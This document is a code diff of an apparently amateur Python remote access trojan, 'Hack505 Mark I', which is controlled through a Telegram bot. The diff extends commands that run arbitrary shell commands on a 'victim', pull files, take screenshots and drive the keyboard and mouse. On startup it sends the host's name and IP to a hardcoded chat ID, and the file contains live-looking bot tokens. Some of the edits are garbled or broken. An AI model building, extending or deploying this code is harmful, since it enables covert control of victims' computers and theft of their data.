@@ -10,14 +10,14 @@ import socket
 import os
 
 
-ROOT_DIR = "/"
-os.chdir(ROOT_DIR)
+# ROOT_DIR = "/"
+# os.chdir(ROOT_DIR)
 
 try:
     with open('token.txt', 'r') as f:
         TOKEN = f.read()
 except Exception as E:
-    TOKEN = "6845961407:AAFXT750B4Zhsb-utIuMrTPUtNksOUX7HwY"  # @hack505Mark1bot
+    TOKEN = "6845961407:AAGbKJc7LSpkokCVw-jJg9ByyaLoO3oBT_Q"  # @hack505Mark1bot
     print(E)
 
 
@@ -40,23 +40,33 @@ def ls(update, context):
 
 
 def system_info(context):
-    hostname = socket.gethostname()
-    ip = socket.gethostbyname(hostname)
-    plat = platform.processor()
-    system = platform.system()
-    machine = platform.machine()
+    try:
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname)
+        plat = platform.processor()
+        system = platform.system()
+        machine = platform.machine()
 
-    info_string = (
-        f"System Information:\n\n"
-        f"Hostname: {hostname}\n"
-        f"IP Address: {ip}\n"
-        f"Processor: {plat}\n"
-        f"System: {system}\n"
-        f"Machine: {machine}")
+        info_string = (
+            f"System Information:\n\n"
+            f"Hostname: {hostname}\n"
+            f"IP Address: {ip}\n"
+            f"Processor: {plat}\n"
+            f"System: {system}\n"
+            f"Machine: {machine}")
 
-    # Replace 'YOUR_CHAT_ID' with the actual chat ID where you want to send the message
-    context.bot.send_message(chat_id='5118057698', text=info_string)
-    # update.message.reply_text(info_string)
+        try:
+            update.message.reply_text(info_string)
+            sys_info_send = True
+        except:
+            pass
+
+        # Replace 'YOUR_CHAT_ID' with the actual chat ID where you want to send the message
+            context.bot.send_message(
+                chat_id="5118057698", text=info_string)
+    except Exception as e:
+        # update.message.reply_text(f"Error: {e}")
+        print(e)
 
 
 def yo(update, context):
@@ -67,9 +77,21 @@ def yo(update, context):
         "Hey!",
         "Welcome!",
         "Good day!",
-        "Nice to see you!"]
+        "Nice to see you!"
+        "How it's going!"
+        "what on your mind now!"
+        "say Ram Ram"
+        "say jai shree Ram"
+        "did you done it today?"
+        "What do you think"
+        "Drink some water now!"
+        "What is time now?"
+        "you are doing great!"
+        "what is sin 0^2 * cos 0^2"
+    ]
 
     update.message.reply_text(f"{random.choice(greetings)}")
+    # print(greetings)
 
 
 def take_screenshot():
@@ -83,16 +105,25 @@ def take_screenshot():
 
 def start(update, context):
     update.message.reply_text(
-        "Hello! Welcoming you to Hack505 offical.it's Mark I")
+        "Hello! Welcoming you to Hack505 offical's . It's Mark I")
 
 
 def help(update, context):
-    update.message.reply_text("""
-/start
-/content
-/jarvis
-/screen                                                            
-""")
+    update.message.reply_text(""""How can I help you!
+                              
+    /start    --> just a start
+    /yo       --> Greet's you
+    /screen   --> Get you the screeshot
+    /content  --> chat_idIt all about the content
+    /jarvis   --> Extecute any command you want!
+    /download --> Get any file form viticm
+    /press    --> Press's special keys
+    /arrow    --> use the arrows key now!
+    /cd       --> let's change the dir
+    /ls       --> It list the file name
+    $mouse    --> Get the mouse cooradanates
+    $type     --> Type anything you want!
+                              """)
 
 
 def content(update, context):
@@ -161,14 +192,17 @@ def download_file(update, context):
 
 
 def press_key(update, context):
+    print("Press key to continue")
     try:
-        # Extract the key combination after the /presskey command
-        key_combination = update.message.text[len('/press'):].strip()
+        # Extract the keyour_context_variabley combination after the /presskey command
+        key_combination = update.message.text[len('/press '):]
         if key_combination:
-            pyautogui.hotkey(*key_combination.split())
+            key_combination = key_combination.split()
+            print(key_combination)
+            pyautogui.hotkey(*key_combination)
         else:
             update.message.reply_text(
-                "Please provide a key combination after the /presskey command.")
+                "Please provide a key combination after the /press command.")
     except Exception as e:
         update.message.reply_text(f"Error: {e}")
 
@@ -196,13 +230,13 @@ def arrow_key(update, context):
 
 
 def download_requested_file(update: Update, context: CallbackContext) -> None:
-    UPLOAD_FOLDER = os.getcwd()
+    upload_folder = os.getcwd()
     try:
         # Extract the file name from the command
         file_name = update.message.text[len('/download '):].strip()
 
         # Check if the requested file exists
-        file_path = os.path.join(UPLOAD_FOLDER, file_name)
+        file_path = os.path.join(upload_folder, file_name)
         if os.path.exists(file_path):
             # Send the requested file to the user who sent the command
             update.message.reply_document(document=open(file_path, 'rb'))
@@ -213,6 +247,30 @@ def download_requested_file(update: Update, context: CallbackContext) -> None:
 
 
 updater = telegram.ext.Updater(TOKEN, use_context=True)
+
+
+def edit_message(update, context):
+    try:
+        print("i have reached here to edit")
+        new_message_text = "This message has been edited."
+        chat_id = update.message.chat_id
+
+        # Send a new message
+        sent_message = context.bot.send_message(
+            chat_id=chat_id, text=new_message_text)
+
+        # Edit the new message
+        context.bot.edit_message_text(
+            chat_id=chat_id, message_id=sent_message.message_id, text="Okay")
+
+        update.message.reply_text("Message edited successfully!")
+
+    except Exception as e:
+        update.message.reply_text(f"Error: {e}")
+
+
+updater = telegram.ext.Updater(TOKEN, use_context=True)
+
 disp = updater.dispatcher
 
 disp.add_handler(telegram.ext.CommandHandler('start', start))
@@ -225,8 +283,9 @@ disp.add_handler(telegram.ext.MessageHandler(
 disp.add_handler(telegram.ext.CommandHandler('jarvis', run_command))
 disp.add_handler(telegram.ext.MessageHandler(
     telegram.ext.Filters.document, download_file))
-disp.add_handler(telegram.ext.CommandHandler("yo", yo))
-disp.add_handler(telegram.ext.CommandHandler("press", press_key))
+disp.add_handler(telegram.ext.CommandHandler('yo', yo))
+# disp.add_handler(telegram.ext.CommandHandler('yo', yo))
+disp.add_handler(telegram.ext.CommandHandler('press', press_key))
 disp.add_handler(telegram.ext.MessageHandler(
     telegram.ext.Filters.regex("arrow"), arrow_key))
 # disp.add_handler(telegram.ext.CommandHandler("sys", system_info_on_request))
@@ -234,6 +293,8 @@ disp.add_handler(CommandHandler("download", download_requested_file))
 disp.add_handler(CommandHandler("cd", cd))
 disp.add_handler(CommandHandler("ls", ls))
 
+# updater.job_queue.run_once(system_info, 0, context=updater)
+# updater.job_queue.run_once(lambda context: system_info(None, context), 0)
 updater.job_queue.run_once(system_info, 0)
 
 updater.start_polling()
